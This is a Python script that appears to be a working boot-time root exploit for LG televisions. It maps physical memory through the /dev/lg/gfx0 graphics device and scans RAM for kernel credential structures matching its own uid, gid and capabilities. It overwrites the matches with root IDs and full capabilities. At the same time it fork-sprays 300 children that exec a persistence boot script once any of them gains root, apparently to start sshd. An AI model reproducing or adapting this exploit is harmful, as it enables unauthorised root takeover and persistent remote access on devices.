# -*- coding: utf-8 -*-
# Boot-time root escalation via GFX credential blast.
# Stripped-down escalation for boot persistence: fork-sprays children that
# poll for root and exec boot-root.sh when they get it.
#
# Used on models without the chokidar boot path (e.g. NANO95/E60) where
# the CYTV nativehome service triggers this script at boot.
#
# Dynamic MMIO skip: reads /proc/iomem to avoid non-RAM regions that would
# kernel-panic if mapped through /dev/lg/gfx0.
import os, ctypes, struct, re, fcntl, sys, time, signal

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype = ctypes.c_long
SYS_mmap2 = 192
MAP_SHARED = 0x01
PROT_READ = 0x01
PROT_WRITE = 0x02
GFX = "/dev/lg/gfx0"
GFX_SET_CACHED = 0x400c470c
CHUNK = 16 * 1024 * 1024
BOOT_SCRIPT = "/media/developer/natxo/boot-root.sh"
LOG = "/tmp/natxo-escalate.log"

def log(msg):
    try:
        f = open(LOG, "a")
        f.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
        f.close()
    except:
        pass

if os.getuid() == 0:
    log("Already root, running boot script")
    os.execv("/bin/sh", ["sh", BOOT_SCRIPT])

try:
    open(GFX, "r").close()
except:
    log("No GFX device, exiting")
    sys.exit(0)

t = open("/proc/lg/gfx/mem_stat").read()
base = int(re.search(r"mem base.*?0x([0-9a-fA-F]+)", t).group(1), 16)
length = int(re.search(r"mem length.*?\((\d+)\)", t).group(1))
carveout_end = (base + length + 0xfff) & ~0xfff
top_pfn, spanned = 0, None
for line in open("/proc/zoneinfo"):
    s = line.split()
    if len(s) >= 2 and s[0] == "spanned": spanned = int(s[1])
    elif len(s) >= 2 and s[0].rstrip(":") == "start_pfn" and spanned is not None:
        top_pfn = max(top_pfn, int(s[1].rstrip(":")) + spanned)
ram_top = top_pfn << 12

def detect_mmio_skip_ranges(scan_lo, scan_hi):
    try:
        lines = open("/proc/iomem").readlines()
    except:
        return []
    ram_set = []
    for line in lines:
        if line[0] in (' ', '\t'):
            continue
        m = re.match(r'\s*([0-9a-fA-F]+)-([0-9a-fA-F]+)\s*:\s*(.*)', line)
        if not m:
            continue
        lo = int(m.group(1), 16)
        hi = int(m.group(2), 16) + 1
        label = m.group(3).strip()
        if lo >= scan_hi or hi <= scan_lo:
            continue
        if "System RAM" in label:
            ram_set.append((max(lo, scan_lo), min(hi, scan_hi)))
    ram_set.sort()
    merged = []
    for lo, hi in ram_set:
        if merged and lo <= merged[-1][1]:
            merged[-1] = (merged[-1][0], max(merged[-1][1], hi))
        else:
            merged.append((lo, hi))
    skips = []
    cursor = scan_lo
    for rlo, rhi in merged:
        if rlo > cursor:
            skips.append((cursor, rlo))
        cursor = max(cursor, rhi)
    if cursor < scan_hi:
        skips.append((cursor, scan_hi))
    return skips

SKIP_RANGES = detect_mmio_skip_ranges(carveout_end, ram_top)
if SKIP_RANGES:
    log("MMIO skip: %d region(s)" % len(SKIP_RANGES))

uid = os.getuid()
gid = os.getgid()

cap_text = {}
for line in open("/proc/self/status"):
    for name in ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb"):
        if line.startswith(name + ":\t"):
            cap_text[name] = int(line.split(":\t")[1].strip(), 16)

uid_gid = (struct.pack('<I', uid) + struct.pack('<I', gid)) * 4
sig = uid_gid + struct.pack('<I', 0)
sig += struct.pack('<Q', cap_text.get('CapInh', 0))
sig += struct.pack('<Q', cap_text.get('CapPrm', 0))
sig += struct.pack('<Q', cap_text.get('CapEff', 0))
sig += struct.pack('<Q', cap_text.get('CapBnd', 0))

log("uid=%d gid=%d base=0x%x top=0x%x" % (uid, gid, base, ram_top))

def gfx_map(phys, l, prot):
    if l <= 0 or phys < base or phys + l > ram_top:
        return (None, 0, -1)
    for slo, shi in SKIP_RANGES:
        if phys < shi and phys + l > slo:
            return (None, 0, -1)
    b = phys & ~0xfff
    span = ((phys + l - b + 0xfff) & ~0xfff) or 0x1000
    pgoff = (b - base) >> 12
    fd = os.open(GFX, os.O_RDWR)
    fcntl.ioctl(fd, GFX_SET_CACHED, struct.pack('<III', 1, 0, 0))
    a = libc.syscall(SYS_mmap2, 0, span, prot, MAP_SHARED, fd, pgoff)
    if a is None or a == 0 or a == 0xffffffff:
        os.close(fd)
        return (None, 0, -1)
    return (a, span, fd)

def gfx_write(phys, data):
    a, span, fd = gfx_map(phys, len(data), PROT_READ | PROT_WRITE)
    if a is None:
        return False
    off_in = phys - (phys & ~0xfff)
    ctypes.memmove(a + off_in, data, len(data))
    libc.munmap(ctypes.c_void_p(a), span)
    os.close(fd)
    return True

SPRAY_COUNT = 300

log("Spraying %d forks..." % SPRAY_COUNT)
children = []
for i in range(SPRAY_COUNT):
    pid = os.fork()
    if pid == 0:
        for _ in range(600):
            if os.getuid() == 0:
                log("ROOT child pid=%d" % os.getpid())
                os.execv("/bin/sh", ["sh", BOOT_SCRIPT])
            time.sleep(0.1)
        os._exit(0)
    children.append(pid)

log("Scanning...")
hits = []
off = carveout_end
while off < ram_top:
    in_skip = False
    for slo, shi in SKIP_RANGES:
        if off >= slo and off < shi:
            off = shi
            in_skip = True
            break
    if in_skip or off >= ram_top:
        continue
    l = min(CHUNK, ram_top - off)
    a, span, fd = gfx_map(off, l, PROT_READ)
    if a is None:
        off += l
        continue
    buf = ctypes.string_at(a, l)
    libc.munmap(ctypes.c_void_p(a), span)
    os.close(fd)
    p = buf.find(sig)
    while p != -1:
        phys = off + p
        if p >= 4:
            usage = struct.unpack('<I', buf[p-4:p])[0]
            if 0 < usage < 500:
                hits.append((phys, usage))
        p = buf.find(sig, p + 1)
    off += l

log("Found %d creds" % len(hits))

if not hits:
    log("No creds found, aborting")
    for pid in children:
        try: os.kill(pid, signal.SIGTERM)
        except: pass
    sys.exit(1)

root_uids = b'\x00' * 32
root_caps = struct.pack('<I', 0) + struct.pack('<QQQQQ',
    0x3fffffffff, 0x3fffffffff, 0x3fffffffff, 0x3fffffffff, 0x3fffffffff)

log("Blasting %d creds..." % len(hits))
for phys, usage in hits:
    gfx_write(phys, root_uids)
    gfx_write(phys + 32, root_caps)

log("Waiting for child to get root...")
for i in range(120):
    try:
        if os.path.exists("/tmp/natxo-boot.log"):
            recent = open("/tmp/natxo-boot.log").read()
            if "boot-root" in recent and "sshd started" in recent:
                log("Boot script completed")
                break
    except:
        pass
    time.sleep(0.1)

time.sleep(3)
for pid in children:
    try: os.kill(pid, signal.SIGTERM)
    except: pass
log("Done")
